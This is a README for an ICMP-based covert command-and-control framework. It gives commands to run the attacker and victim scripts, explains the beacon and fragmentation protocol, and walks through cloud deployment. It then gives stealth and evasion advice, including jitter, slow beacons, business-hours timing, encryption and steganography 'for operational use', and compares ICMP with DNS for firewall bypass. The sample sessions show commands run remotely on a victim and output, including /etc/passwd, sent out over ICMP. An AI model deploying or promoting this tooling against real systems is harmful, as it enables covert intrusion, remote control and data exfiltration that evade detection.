# ICMP C2 Framework

A covert command and control framework using ICMP Echo Request/Reply packets (ping) for communication.

## Features

- **Beacon-Based Architecture** - victim initiates contact (evades firewall restrictions)
- **High Bandwidth** - ~1200 bytes per beacon (raw data, no encoding overhead)
- **Fragmentation Protocol** - reliable transmission of large outputs with MD5 checksums
- **Auto-Detection** - automatically detects network interfaces and victim IPs
- **Simple Implementation** - no encoding, just raw data in ICMP payload
- **AWS Ready** - production deployment on EC2

## Quick Start

### Local Testing

```bash
# Terminal 1 - Attacker
sudo python3 attacker/attacker_icmp.py -a

# Terminal 2 - Victim
sudo python3 victim/victim_icmp.py 127.0.0.1

# Issue commands in Terminal 1
C&C> whoami
C&C> ls -la
```

### Production Deployment

```bash
# Attacker (get public IP first)
curl ifconfig.me  # Example: 213.57.121.34
sudo python3 attacker/attacker_icmp.py -a

# Victim
sudo python3 victim/victim_icmp.py 213.57.121.34
```

## Installation

```bash
# Install dependencies
sudo apt update && sudo apt install -y python3-pip
sudo pip3 install scapy netifaces
```

**Requirements**: Python 3.6+, Root/sudo privileges

## Command Line Options

### Attacker

```bash
sudo python3 attacker_icmp.py [-v <victim-ip>] [-i <interface>] [-a]

Optional:
  -v, --victim VICTIM       Specific victim IP (auto-detected if omitted)
  -i, --interface IFACE     Network interface (auto-detected)
  -a, --accept-all          Accept beacons from any victim (recommended)
```

### Victim

```bash
sudo python3 victim_icmp.py <attacker-ip> [-i <interval>]

Required:
  attacker_ip               Attacker IP address

Optional:
  -i, --interval SECONDS    Beacon interval (default: 3)
```

## How It Works

### Beacon Protocol

```text
┌─────────────┐                           ┌─────────────┐
│   VICTIM    │                           │  ATTACKER   │
│             │  ICMP Echo Request        │             │
│             │  (Beacon with output)     │             │
│             │ ─────────────────────────>│             │
│             │                           │             │
│             │  ICMP Echo Reply          │             │
│             │  (Command to execute)     │             │
│             │ <─────────────────────────│             │
└─────────────┘                           └─────────────┘
```

1. **Victim beacons every 3 seconds** with ICMP Echo Request containing:

   - Current command output (or status message)
   - Fragmentation metadata if output is large
   - Sequence number for tracking

2. **Attacker responds** with ICMP Echo Reply containing:

   - Next command to execute
   - Or "NOOP" if no command pending

3. **Race condition avoidance**: AsyncSniffer starts listening before beacon is sent

### Message Types

- `BEACON_INIT` - Initial beacon when victim starts
- `SINGLE|data` - Command output fits in one packet
- `FRAG|id|current/total|checksum|data` - Fragment of large output
- `READY` - All fragments sent, awaiting next command
- `NOOP` - No command (keep-alive)

### Fragmentation Protocol

Large outputs (>1200 bytes) are split into fragments:

**Format**: `FRAG|id|current/total|checksum|data`

**Example**: `FRAG|abc123|1/5|d41d8cd98f00b204e9800998ecf8427e|chunk_data`

**Features**:

- MD5 checksum ensures data integrity
- Automatic reassembly on attacker side
- Handles outputs up to ~100KB efficiently

## AWS EC2 Deployment

### Step 1: Security Groups

**Attacker Instance:**

- **Inbound**: ICMP Echo Request from `0.0.0.0/0`
- **Outbound**: ICMP Echo Reply to `0.0.0.0/0`

**Victim Instance:**

- **Outbound**: ICMP Echo Request to `0.0.0.0/0`
- **Inbound**: ICMP Echo Reply from `0.0.0.0/0`

### Step 2: Deploy

**On Attacker EC2:**

```bash
# Get public IP
curl ifconfig.me  # Example: 213.57.121.34

# Install dependencies
sudo apt update && sudo apt install -y python3-pip
sudo pip3 install scapy netifaces

# Run attacker
sudo python3 attacker_icmp.py -a
```

**On Victim EC2:**

```bash
# Install dependencies
sudo apt update && sudo apt install -y python3-pip
sudo pip3 install scapy

# Run victim
sudo python3 victim_icmp.py 213.57.121.34
```

### Step 3: Verify

```bash
# Test connectivity first
ping <other-instance-ip>

# Monitor ICMP traffic on attacker
sudo tcpdump -i any icmp -n

# Should see beacons arriving every 3 seconds
```

## Usage Examples

### Basic Usage

```bash
# Attacker accepts any victim
sudo python3 attacker_icmp.py -a

# Victim beacons to specific attacker
sudo python3 victim_icmp.py 192.168.1.100
```

### Custom Beacon Interval

```bash
# Beacon every 10 seconds (stealthier)
sudo python3 victim_icmp.py 192.168.1.100 -i 10

# Beacon every 5 minutes (very stealthy)
sudo python3 victim_icmp.py 192.168.1.100 -i 300
```

### Specify Network Interface

```bash
# Useful when multiple interfaces present
sudo python3 attacker_icmp.py -a -i eth0
```

### Multiple Victims

```bash
# Attacker in promiscuous mode accepts all victims
sudo python3 attacker_icmp.py -a

# Each victim beacons independently
# Terminal 1: sudo python3 victim_icmp.py 192.168.1.100
# Terminal 2: sudo python3 victim_icmp.py 192.168.1.100
# Terminal 3: sudo python3 victim_icmp.py 192.168.1.100
```

## Production Considerations

### Stealth Improvements

| Technique            | Example                       | Benefit                  |
| -------------------- | ----------------------------- | ------------------------ |
| Slow beacon interval | `-i 300` (every 5 minutes)    | Reduces traffic volume   |
| Add jitter           | Randomize intervals ±30 sec   | Breaks pattern detection |
| Time-based beaconing | Only during business hours    | Blends with normal usage |
| Traffic shaping      | Match normal ping packet size | Harder to fingerprint    |

### Security Limitations

⚠️ **Current Implementation:**

- Commands and outputs sent in plaintext
- No authentication mechanism
- ICMP traffic can be logged/analyzed by IDS

**For Operational Use:**

- Implement encryption (XOR, AES, ChaCha20)
- Add authentication (HMAC)
- Use steganography (hide data in timing/packet sizes)

### Detection Risks

⚠️ Regular ICMP beacons at fixed intervals  
⚠️ Unusual ICMP packet sizes (large payloads)  
⚠️ Bi-directional ICMP traffic (unusual for ping)  
⚠️ Long-lived ICMP sessions

**Mitigation**: Add jitter, slower intervals, limit packet sizes

## Troubleshooting

### No Beacons Received

**Checklist:**

1. ✅ Check security groups/firewall allow ICMP
2. ✅ Verify both scripts running with `sudo`
3. ✅ Test connectivity: `ping <other_ip>`
4. ✅ Check interface: `sudo tcpdump -i any icmp`

### Permission Errors

Always run with `sudo` (requires raw socket access):

```bash
sudo python3 attacker_icmp.py -a
sudo python3 victim_icmp.py <ip>
```

### Kernel ICMP Reply Warnings

Scripts automatically suppress kernel ICMP replies. If warnings appear:

- Ensure running with `sudo`
- On cloud providers, `/proc/sys/net/ipv4/icmp_echo_ignore_all` may be restricted
- Scripts include graceful fallback

### Interface Detection Fails

Specify manually:

```bash
sudo python3 attacker_icmp.py -a -i eth0
```

## Expected Output

**Attacker Terminal:**

```text
ICMP C2 Server - Beacon-based Command & Control
============================================================
[*] Listening for ICMP beacons from ANY victim on eth0...
[!] New victim detected: 172.31.5.23
[*] BEACON from 172.31.5.23: BEACON_INIT
C&C> whoami
[*] Command queued. Waiting for next beacon...
[+] OUTPUT:
============================================================
ubuntu
============================================================
C&C> ls -la
[*] Command queued. Waiting for next beacon...
[*] BEACON from 172.31.5.23 - Fragments: 1/3
[*] BEACON from 172.31.5.23 - Fragments: 2/3
[*] BEACON from 172.31.5.23 - Fragments: 3/3
[+] OUTPUT:
============================================================
total 52
drwxr-xr-x 5 ubuntu ubuntu 4096 Oct 19 10:00 .
drwxr-xr-x 3 root   root   4096 Oct 19 09:30 ..
-rw-r--r-- 1 ubuntu ubuntu  220 Oct 19 09:30 .bash_logout
...
============================================================
C&C>
```

**Victim Terminal:**

```text
[*] Victim started - beaconing to 213.57.121.34 every 3s
[*] Sending ICMP beacon #1: BEACON_INIT
[+] Command received: whoami
[*] Executing: whoami
[*] Sending ICMP beacon #2: SINGLE|ubuntu
[+] Command received: ls -la
[*] Executing: ls -la
[*] Output too large (2400 bytes), fragmenting...
[*] Sending fragment 1/3
[*] Sending fragment 2/3
[*] Sending fragment 3/3
```

## Comparison: ICMP vs DNS C2

| Feature              | ICMP C2            | DNS C2           |
| -------------------- | ------------------ | ---------------- |
| **Bandwidth**        | High (~1200 bytes) | Low (~125 bytes) |
| **Stealth**          | Medium             | High             |
| **Firewall Bypass**  | Good               | Excellent        |
| **Setup Complexity** | Simple             | Moderate         |
| **Encoding**         | None (raw)         | Base32           |
| **Detection Risk**   | Medium             | Low              |
| **Requirements**     | None               | Domain ownership |

**When to use ICMP:**

- ✅ High bandwidth needed (large file transfers)
- ✅ Fast command execution is priority
- ✅ Simple setup preferred
- ✅ ICMP traffic allowed on network

**When to use DNS:**

- ✅ Maximum stealth required
- ✅ Firewall bypass critical
- ✅ Can register a domain
- ✅ Long-term persistence needed

## Testing

### Verify Fragmentation

```bash
# Issue command with large output
C&C> cat /etc/passwd

# Should see multiple fragments:
[*] BEACON from 172.31.5.23 - Fragments: 1/8
[*] BEACON from 172.31.5.23 - Fragments: 2/8
...
[*] BEACON from 172.31.5.23 - Fragments: 8/8
[+] OUTPUT:
<large output successfully reassembled>
```

### Local Network Test

1. Find your IP: `ip addr show` or `hostname -I`
2. Run attacker: `sudo python3 attacker/attacker_icmp.py -a`
3. Run victim: `sudo python3 victim/victim_icmp.py <your_ip>`
4. Issue command: Type `whoami` when prompted
